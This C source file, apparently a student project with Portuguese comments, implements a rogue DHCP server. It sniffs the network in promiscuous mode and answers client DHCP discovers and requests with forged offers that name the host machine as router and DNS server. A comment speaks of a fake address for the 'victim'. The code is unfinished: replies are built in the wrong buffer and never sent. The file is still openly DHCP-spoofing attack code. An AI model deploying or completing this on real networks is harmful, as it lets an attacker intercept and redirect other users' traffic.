#include <linux/tcp.h>
#include <linux/udp.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include "monitor.h"
#include "dhcp.h"
#include "checksum.h"

unsigned char buffer[BUFFSIZE];
unsigned char send_buffer[BUFFSIZE];
char* IF_NAME;

int sockd;
int on;
struct ifreq ifr;
struct ifreq mac_address;
pthread_t receiver_thread, report_thread;

void setup()
{
	if((sockd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		printf("Erro na criação do socket.\n");
		exit(1);
	}

	strcpy(ifr.ifr_name, IF_NAME);

	if(ioctl(sockd, SIOCGIFINDEX, &ifr) < 0)
	{
		printf("Erro no ioctl!\n");
		exit(1);
	}

	eth_header  = (struct ether_header*) buffer;
	ip_header   = (struct iphdr*)   (buffer + sizeof(struct ether_header));
	tcp_header  = (struct tcphdr*)  (buffer + (sizeof(struct ether_header) + sizeof(struct iphdr)));
	udp_header  = (struct udphdr*)  (buffer + (sizeof(struct ether_header) + sizeof(struct iphdr)));
	dhcp_header = (struct dhcp_packet*)  (buffer + (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)));

	ioctl(sockd, SIOCGIFFLAGS, &ifr);
	ifr.ifr_flags |= IFF_PROMISC;
	ioctl(sockd, SIOCSIFFLAGS, &ifr);

	int s;
	s = socket(PF_INET, SOCK_DGRAM, 0);
	memset(&mac_address, 0x00, sizeof(mac_address));
	strcpy(mac_address.ifr_name, IF_NAME);
	ioctl(sockd, SIOCGIFHWADDR, &mac_address);
	close(s);
}

void fill_ethernet()
{
	struct ether_header* header;
	header  = (struct ether_header*) send_buffer;

	header->ether_type = 0x0800;

	for (int i = 0; i < 6; i++)
	{
		header->ether_shost[i] = mac_address.ifr_hwaddr.sa_data[i];
		header->ether_dhost[i] = eth_header->ether_shost[i];
	}

}

void fill_ip()
{
	struct iphdr* header;
	header = (struct iphdr*) (send_buffer + sizeof(struct ether_header));

	//TODO: Change this to get correct ip from machine and fake ip for victim.
	char *src_addr="192.168.1.33";
	char *dst_addr="192.168.1.34";

	header->ihl = 5;
	header->version = 4;
	header->tot_len = 20;
	header->protocol = IPPROTO_UDP;
	header->saddr = inet_addr(src_addr);
	header->daddr = inet_addr(dst_addr);
	header->check = in_cksum((unsigned short *)header, sizeof(struct iphdr));
}

void fill_dhcp(unsigned char type)
{
	struct dhcp_packet* header;
	header = (struct dhcp_packet*)  (buffer + (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)));

	header->op = 2;
	header->htype = 1;
	header->hlen = 6;
	header->hops = 0;
	header->xid = dhcp_header->xid;
	header->secs = 0;
	header->flags = 0;

	header->ciaddr = dhcp_header->ciaddr;
	inet_aton("192.168.1.34", &header->yiaddr);
	header->siaddr = dhcp_header->siaddr;
	header->giaddr = dhcp_header->giaddr;

	for (int i = 0; i < 6; i++)
	{
		header->chaddr[i] = eth_header->ether_shost[i];
	}

	unsigned char IP_HEX1 = 0xc0;
	unsigned char IP_HEX2 = 0xa8;
	unsigned char IP_HEX3 = 0X00;
	unsigned char IP_HEX4 = 0X64;

	header->options[0]=0x63;
	header->options[1]=0x82;
	header->options[2]=0x53;
	header->options[3]=0x63;

	//DHCP Message Type (Offer)
	header->options[4]=0x35;
	header->options[5]=0x01;
	header->options[6]=type;

	//DHCP Server Identifer (MEU IP)(MAQUINA HOST)
	header->options[7]=0x36;
	header->options[8]=0x04;
	header->options[9]=IP_HEX1;
	header->options[10]=IP_HEX2;
	header->options[11]=IP_HEX3;
	header->options[12]=IP_HEX4;

	//Subnet Mask  (255.255.255.0)

	header->options[13]=0x01;
	header->options[14]=0x04;
	header->options[15]=0xff;
	header->options[16]=0xff;
	header->options[17]=0xff;
	header->options[18]=0x00;

	//IP Address Lease Time

	header->options[19]=0x33;
	header->options[20]=0x04;
	header->options[21]=0x00;
	header->options[22]=0x01;
	header->options[23]=0x38;
	header->options[24]=0x80;

	//Router

	header->options[25]=0x03;
	header->options[26]=0x04;
	header->options[27]=IP_HEX1;
	header->options[28]=IP_HEX2;
	header->options[29]=IP_HEX3;
	header->options[30]=IP_HEX4;

	//Domain Name Server

	header->options[31]=0x06;
	header->options[32]=0X04;
	header->options[33]=IP_HEX1;
	header->options[34]=IP_HEX2;
	header->options[35]=IP_HEX3;
	header->options[36]=IP_HEX4;

	//Broadcast

	header->options[37]=0x1c;
	header->options[38]=0X04;
	header->options[39]=0xff;
	header->options[40]=0xff;
	header->options[41]=0xff;
	header->options[42]=0xff;

	// End
	header->options[43]=0xff;

}

void send_dhcp(unsigned char type)
{
	fill_ethernet();
	fill_ip();
	fill_dhcp(type);
}

void dhcp_handler()
{
	unsigned char *options = dhcp_header->options;
	int i = 4;
	while (true) {
		unsigned char type = options[i++];
		if (type == 255)
			break;
		unsigned char len = options[i++];
		if (type == 53) {
			if (options[i] == 1 || options[i] == 3) {
				send_dhcp(options[i]);
			}
		}
		i+=len;
	}
}

void udp_handler()
{
	unsigned int port_dest = (unsigned int)ntohs(udp_header->dest);
	if (port_dest == 67)
		dhcp_handler();
}

void tcp_handler()
{

}
void ip_handler()
{
	unsigned int ip_protocol = (unsigned int)ip_header->protocol;

	if (ip_protocol == 0x6)
		tcp_handler();

	else if (ip_protocol == 0x11)
		udp_handler();
}

void* sniffer()
{
	while (true)
	{

		recv(sockd,(char *) &buffer, sizeof(buffer), 0x0);

		u_int16_t ether_type = ntohs(eth_header->ether_type);
		if(ether_type == 0x0800)
			ip_handler();
	}
}

int monitor_start(int argc, char* argv[])
{

	if(argc <= 1)
	{
		printf("Format: ./main interface\n");
		return 0;
	}
	IF_NAME = argv[1];

	setup();
	// pthread_create(&receiver_thread, NULL, sniffer, NULL);
	sniffer();
	return 0;
}
